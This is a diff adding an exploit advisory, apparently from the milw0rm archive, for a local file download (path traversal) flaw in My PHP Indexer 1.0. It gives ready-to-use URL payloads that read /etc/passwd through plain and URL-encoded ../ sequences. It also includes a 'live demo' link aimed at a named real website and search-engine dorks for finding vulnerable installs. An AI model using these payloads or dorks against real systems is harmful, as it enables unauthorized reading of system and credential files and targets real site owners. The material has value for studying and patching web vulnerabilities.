@@ -1,0 +1,31 @@
+# My PHP Indexer 1.0 (index.php) Local File Download Vulnerability
+# url: http://sourceforge.net/projects/myphpindexer/
+#
+# Author: JosS
+# mail: sys-project[at]hotmail[dot]com
+# site: http://spanish-hackers.com
+# team: Spanish Hackers Team - [SHT]
+#
+# This was written for educational purpose. Use it at your own risk.
+# Author will be not responsible for any damage.
+
+-----------------------------------------------
+Depending the server configuration is possible 
+that it doesn't allow us to scale directories.
+-----------------------------------------------
+
+vuln file: index.php
+
+PoC:     /index.php?d=[DIR]&f=[FILE]
+Exploit: /index.php?d=../../../../../../../../../../../etc/&f=passwd
+         /index.php?d=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/&f=passwd
+
+live demo:
+[PATH] = ../../../; (%2e%2e%2f%2e%2e%2f%2e%2e%2f)
+[FILE] = index.php;
+http://www.bethesda.org.sg/resources/admin/index.php?d=%2e%2e%2f%2e%2e%2f%2e%2e%2f&f=index.php
+
+dork:     "Powered by My PHP Indexer 1.0"
+dork (2): "priv8 :P"
+
+# milw0rm.com [2008-10-12]
